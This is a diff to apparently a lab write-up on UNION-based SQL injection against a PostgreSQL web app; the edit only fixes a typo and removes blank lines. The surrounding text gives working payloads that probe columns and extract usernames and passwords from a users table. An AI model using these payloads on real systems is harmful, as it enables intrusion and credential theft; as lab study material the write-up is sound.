@@ -12,13 +12,12 @@ Analysis:
 
 3 - 1 =  2 --> The app is using 2 columns
 
-(2) Find which columns contain text. We need to figure this out because our desired output will be in strings i.e usernames/password so we need to find columons
+(2) Find which columns contain text. We need to figure this out because our desired output will be in strings i.e usernames/password so we need to find columns
 that accept strings. 
 ' UNION SELECT 'a', NULL--
 ' UNION SELECT NULL, 'a'-- --> This column returned a value in the output of the webpage. So we know that column (2) accepts a string
 
 (3) Output data from other tables
-
 ' UNION select NULL, username from users--
 ' UNION select NULL, password from users--
 
@@ -28,7 +27,6 @@ compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit
 
 We want the output to display both username and password in one command - so we have to use string concatenation. Since we know this is running PostgreSQL we 
 can look up the syntax and inject it into our payload
-
 
 ' UNION select NULL, username||'**'|| password from users-- 
 
